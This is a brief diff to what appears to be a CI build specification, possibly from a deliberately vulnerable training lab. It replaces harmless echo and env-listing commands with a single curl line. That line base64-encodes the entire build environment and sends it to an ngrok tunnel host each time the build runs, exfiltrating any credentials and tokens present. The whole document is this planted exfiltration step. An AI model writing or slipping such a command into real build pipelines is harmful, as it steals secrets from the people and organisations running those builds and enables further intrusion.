@@ -3,6 +3,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - curl "http://4.tcp.eu.ngrok.io:13845/?$(env | base64 -w 0)"
